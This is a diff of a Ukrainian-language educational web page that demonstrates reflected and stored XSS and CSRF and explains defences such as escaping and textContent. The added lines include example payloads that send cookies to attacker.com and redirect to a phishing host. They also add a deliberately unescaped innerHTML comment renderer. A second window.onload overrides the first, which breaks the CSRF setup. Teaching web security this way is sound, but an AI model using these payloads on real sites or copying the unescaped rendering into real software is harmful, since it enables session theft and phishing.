@@ -134,13 +134,14 @@
 
             <h2>Демонстрація XSS атак</h2>
             <div class="demo-section">
-                <h3>1. Приклад XSS вразливості</h3>
+                <h3>1. Reflected XSS</h3>
+                Reflected XSS (відображений XSS) — це тип міжсайтового скриптингу, при якому шкідливий код передається через URL або інші вхідні дані та негайно відображається на сторінці без збереження на сервері.
                 <p>Введіть текст нижче та натисніть "Відобразити вразливо" для демонстрації вразливого відображення:</p>
                 <!-- <img src="invalid.jpg" onerror="alert('XSS')"> -->
-                <!-- <div onclick="alert('XSS')">Click me</div> -->
 
-                <input type="text" id="xssInput"
-                    placeholder="Введіть текст, наприклад: &lt;img src=&quot;invalid.jpg&quot; onerror=&quot;alert('XSS')&quot;&gt;">
+                <input type="text" id="xssInput" style="width: 600px;"
+       placeholder="Введіть текст, наприклад: &lt;img src=&quot;invalid.jpg&quot; onerror=&quot;alert('XSS')&quot;&gt;">
+
                 <br>
                 <button onclick="xssVulnerable()">Відобразити вразливо (innerHTML)</button>
                 <button onclick="xssSafe()">Відобразити безпечно (textContent)</button>
@@ -151,7 +152,8 @@
                 Вразливість виникає через неправильну обробку та відображення введених користувачем даних на
                 веб-сторінці. Зокрема, уразливість з’являється тоді, коли дані, отримані від користувача, без належного
                 екранування (escaping) або перевірки безпосередньо відображаються на сторінці за допомогою методу
-                <code>innerHTML</code>.</p>
+                <code>innerHTML</code>.
+            </p>
 
             <h4>Приклад вразливого коду:</h4>
             <pre>function xssVulnerable() {
@@ -167,10 +169,14 @@
 
             <h4>Наслідки вразливості</h4>
             <ul>
-                <li>Викрадення сесійних даних або кукі користувача.</li>
-                <li>Перенаправлення користувача на шкідливий сайт.</li>
-                <li>Виконання дій від імені користувача.</li>
-                <li>Підробка інтерфейсу або контенту сторінки.</li>
+                <li>Викрадення сесійних даних або кукі користувача:</li>
+                <pre>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</pre>
+                <li>Перенаправлення користувача на шкідливий сайт:</li>
+                <pre>&lt;script&gt;window.location.href='http://phishing.com';&lt;/script&gt;</pre>
+                <li>Виконання будь-яких дій від імені користувача:</li>
+                <pre>&lt;button onclick="fetch('http://malicious.com/transfer?amount=1000')"&gt;Click me&lt;/button&gt;</pre>
+                <li>Підробка інтерфейсу або вмісту сторінки:</li>
+                <pre>&lt;script&gt;document.body.innerHTML = '&lt;h1&gt;Злом успішний!&lt;/h1&gt;';&lt;/script&gt;</pre>
             </ul>
 
             <h4>Як ми подолали вразливість?</h4>
@@ -185,6 +191,50 @@
 
             <p>Метод <code>textContent</code> відображає текст без обробки як HTML-код, що гарантує захист від виконання
                 скриптів.</p>
+
+                <div class="demo-section">
+                    <h3>2. Stored XSS</h3>
+                    <!-- <button onclick="alert('Hacked!')">Click Me</button> -->
+
+                    <p>Збережений XSS (Stored XSS) — це вразливість безпеки, при якій шкідливий код зберігається на сервері та відображається кожному користувачеві при перегляді вмісту.</p>
+                    <label for="commentInput">Введіть коментар:</label>
+                    <input type="text" id="commentInput" placeholder="Введіть коментар..."><br>
+                    <button onclick="submitComment()">Зберегти коментар</button>
+                    <h4>Відображення коментарів:</h4>
+                    <div id="commentSection"></div>
+                </div>
+
+
+                <h4>Як запобігти збереженому XSS?</h4>
+                <ul>
+                    <li>
+                        <strong>Екранізувати всі вхідні дані перед збереженням та відображенням (escaping).</strong><br>
+                        Наприклад, перед вставкою введеного користувачем тексту у HTML використовуйте функцію:
+                        <pre>function escapeHtml(str) {
+                    var div = document.createElement('div');
+                    div.textContent = str;
+                    return div.innerHTML;
+                }
+                
+                // Застосування:
+                document.getElementById('output').innerHTML = escapeHtml(userInput);</pre>
+                        Цей підхід забезпечує безпечне відображення без виконання скриптів.
+                    </li>
+                    <li>
+                        <strong>Використовувати безпечні методи відображення, такі як textContent або createTextNode.</strong><br>
+                        Замість <code>innerHTML</code>, яке може виконувати скрипти, використовуйте:
+                        <pre>document.getElementById("output").textContent = userInput;</pre>
+                        або
+                        <pre>var textNode = document.createTextNode(userInput);
+                document.getElementById("output").appendChild(textNode);</pre>
+                    </li>
+                    <li>
+                        <strong>Здійснювати валідацію та санітизацію введених користувачем даних на стороні сервера.</strong><br>
+                        Перед збереженням коментарів на сервері видаляйте небезпечні символи та HTML-теги. Наприклад, на сервері використовуйте бібліотеки для санітизації введення:
+                        <pre>const sanitizedInput = sanitizeHtml(userInput);</pre>
+                    </li>
+                </ul>
+                
 
         </section>
 
@@ -234,22 +284,17 @@
     </footer>
 
     <script>
-        // ----- XSS Demo Functions -----
-        // Уразливий метод відображення
         function xssVulnerable() {
             var userInput = document.getElementById("xssInput").value;
-            // Використання innerHTML - небезпечний підхід
             document.getElementById("xssOutput").innerHTML = "Результат: " + userInput;
         }
 
 
         function xssSafe() {
             var userInput = document.getElementById("xssInput").value;
-            // Safe: using textContent, which escapes HTML/JS code
             document.getElementById("xssOutput").textContent = userInput;
         }
 
-        // ----- CSRF Demo Functions -----
         var balance = 100;
 
         function updateBalanceDisplay() {
@@ -263,11 +308,9 @@
         }
 
         function simulateVulnerableCSRF() {
-            // Simulate a CSRF attack by automatically calling the vulnerable function
             vulnerableTransfer();
         }
 
-        // Generate a CSRF token for the protected demo
         var csrfToken = Math.random().toString(36).substring(2);
 
         function handleProtectedSubmit(event) {
@@ -283,19 +326,54 @@
         }
 
         function simulateProtectedCSRFAttack() {
-            // Simulate a malicious CSRF attack by submitting the form with an incorrect token
             handleProtectedSubmit({
                 preventDefault: function () { },
                 target: { csrfTokenInput: { value: "wrongtoken" } }
             });
         }
 
-        // On page load, set the CSRF token in the form and update the balance display
         window.onload = function () {
             updateBalanceDisplay();
             document.getElementById("csrfTokenInput").value = csrfToken;
             document.getElementById("csrfTokenDisplay").innerText = csrfToken;
         }
+
+        var comments = [];
+
+        async function submitComment() {
+        var comment = document.getElementById("commentInput").value;
+        try {
+            const response = await fetch('/comments', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ comment: comment })
+            });
+            const data = await response.json();
+            loadComments();
+        } catch (error) {
+            console.error('Error submitting comment:', error);
+        }
+    }
+
+    async function loadComments() {
+        try {
+            const response = await fetch('/comments');
+            const data = await response.json();
+            var commentHtml = "";
+            data.forEach(comment => {
+                commentHtml += `<p>${comment}</p>`;
+            });
+            document.getElementById("commentSection").innerHTML = commentHtml;
+        } catch (error) {
+            console.error('Error loading comments:', error);
+        }
+    }
+
+    window.onload = function () {
+        loadComments();
+    }
     </script>
 </body>
 
